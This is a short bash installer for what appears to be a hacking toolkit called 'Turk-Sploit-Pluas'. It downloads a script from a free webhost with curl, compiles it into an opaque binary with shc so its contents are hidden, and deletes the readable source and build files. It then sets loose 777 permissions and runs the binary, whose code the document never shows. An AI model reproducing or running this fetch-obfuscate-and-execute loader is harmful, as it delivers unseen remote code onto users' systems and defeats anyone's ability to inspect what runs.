#!/bin/bash
apt install shc -y
apt install clang -y
apt install curl -y 
apt install wget -y
cd $HOME
wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9.tgz
tar -xvf shc-3.8.9.tgz
cd shc-3.8.9/
make
curl -O https://turksibertimi-forum.000webhostapp.com/start.sh
clang shc.c -o shc && chmod 777 shc
./shc -f start.sh
cd $HOME &&
cp start.sh.x  $HOME/Turk-Sploit-Pluas/
cd $HOME/shc-3.8.9/ && cp start.sh.x  $HOME/Turk-Sploit-Pluas/
rm -rf $HOME/shc-3.8.9.tgz
rm -rf $HOME/shc-3.8.9/
cd $HOME &&
rm -rf start.sh start.sh.x start.sh.x.c
rm -rf $HOME/Turk-Sploit-Pluas/start.sh
cd $HOME/Turk-Sploit-Pluas/ && ls && ./start.sh.x
